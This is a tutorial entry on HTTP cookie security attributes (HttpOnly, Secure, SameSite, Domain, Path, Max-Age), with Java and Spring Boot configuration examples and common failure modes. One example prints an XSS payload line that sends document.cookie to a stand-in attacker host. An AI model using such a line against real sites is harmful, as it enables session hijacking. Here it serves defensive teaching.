---
id: ATH-009
title: "Cookie Mechanics and Security Attributes"
category: Authentication
tier: tier-2-networking-security
folder: ATH-authentication
difficulty: ★☆☆
depends_on: ATH-008
used_by: ATH-014, ATH-015, ATH-034, ATH-046
related: ATH-008, ATH-010
tags:
  - security
  - authentication
  - cookies
  - browser
  - foundational
status: complete
version: 5
layout: default
parent: "Authentication"
grand_parent: "Technical Mastery"
nav_order: 9
permalink: /technical-mastery/authentication/cookie-mechanics-and-security-attributes/
---

⚡ **TL;DR** - Cookies are the browser's mechanism for persisting
session state across HTTP requests. Six security attributes control
where, when, and how cookies are transmitted and accessible.
Missing HttpOnly enables XSS cookie theft; missing Secure sends
cookies over HTTP; wrong SameSite enables CSRF. Getting all three
correct is non-negotiable for session security.

---

### 📊 Entry Metadata

| #009 | Category: Authentication | Difficulty: ★☆☆ |
|:---|:---|:---|
| **Depends on:** | ATH-008 Session-Based Authentication | |
| **Used by:** | ATH-014, ATH-015, ATH-034, ATH-046 | |
| **Related:** | ATH-008 Sessions, ATH-010 Tokens | |

---

### 📘 Textbook Definition

HTTP cookies are name-value pairs stored in the browser and
automatically included in subsequent HTTP requests to the
originating domain. They are set via the Set-Cookie response
header and transmitted via the Cookie request header. Six
security-relevant attributes control cookie behavior: HttpOnly
(prevents JavaScript access), Secure (HTTPS-only transmission),
SameSite (cross-site request restriction), Domain (scope of
transmission), Path (URL path scope), and Max-Age/Expires
(lifetime). These attributes collectively control the cookie's
exposure to XSS, CSRF, and network-level attacks.

---

### ⚙️ How It Works (Mechanism)

**The six security attributes:**

```
┌──────────────────────────────────────────────────────────┐
│            Cookie Security Attribute Map                 │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Set-Cookie: SESSIONID=abc123;                           │
│    HttpOnly;          ← JS cannot read (blocks XSS       │
│                          cookie theft)                   │
│    Secure;            ← HTTPS only (blocks plaintext     │
│                          transmission)                   │
│    SameSite=Strict;   ← Not sent on cross-site requests  │
│                          (blocks CSRF)                   │
│    Domain=example.com;← Which domains receive this cookie│
│    Path=/;            ← Which URL paths receive it        │
│    Max-Age=86400      ← Expires in 24 hours              │
│                                                          │
│  ATTACK PREVENTED BY EACH ATTRIBUTE:                     │
│    HttpOnly  → XSS script steals session via document.cookie │
│    Secure    → Network observer reads cookie on HTTP    │
│    SameSite  → Malicious site triggers authenticated req │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

**SameSite values explained:**

| Value | Cross-site GET | Cross-site POST | When to use |
|---|---|---|---|
| `Strict` | Blocked | Blocked | Highest security; breaks OAuth redirects |
| `Lax` | Allowed (top-level nav) | Blocked | Good default; allows normal link navigation |
| `None` | Allowed | Allowed | Required for third-party embeds; MUST use Secure |

---

### 💻 Code Examples

**Example - BAD vs GOOD: cookie configuration**

```java
// BAD: session cookie with no security attributes
// Vulnerable to XSS theft, CSRF, and plaintext interception
response.addCookie(new Cookie("SESSIONID", sessionId));

// GOOD: all security attributes set
ResponseCookie cookie = ResponseCookie.from("SESSIONID", id)
    .httpOnly(true)      // blocks JS access (XSS defense)
    .secure(true)        // HTTPS only
    .sameSite("Lax")     // CSRF defense (allows GET nav)
    .path("/")
    .maxAge(Duration.ofHours(24))
    .build();
response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
```

**Example - Spring Boot global cookie config**

```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer s = new DefaultCookieSerializer();
    s.setCookieName("SESSIONID");
    s.setUseHttpOnlyCookie(true);
    s.setUseSecureCookie(true);
    s.setSameSite("Lax");
    s.setCookieMaxAge(86400);
    return s;
}
```

**Example - FAILURE: missing HttpOnly allows XSS session theft**

```javascript
// Attacker injects via XSS vulnerability:
// Without HttpOnly: this works and steals the session
fetch("https://attacker.com/steal?c=" + document.cookie);

// With HttpOnly: document.cookie does NOT include
// HttpOnly cookies - this returns empty string
// Session cookie is invisible to JavaScript entirely
```

---

### ⚠️ Common Failure Modes

**SameSite=None without Secure:**

```
Symptom: browser ignores SameSite=None; cookie sent only
for same-site requests (not the intended cross-site behavior).

Root cause: Chrome 80+ (2020) enforces: SameSite=None
requires Secure. Without Secure, SameSite=None cookies
are rejected/treated as SameSite=Lax.

Fix: always pair SameSite=None with Secure attribute.
```

**Cookie scope too broad (Domain=.example.com):**

```
Symptom: session cookie sent to all subdomains including
potentially compromised subdomains (user-content.example.com).

Fix: set Domain to the specific subdomain (app.example.com)
not the parent domain. A compromised subdomain cannot
then steal sessions from other subdomains.
```

---

*Authentication category: ATH | Entry: ATH-009 | v5.0*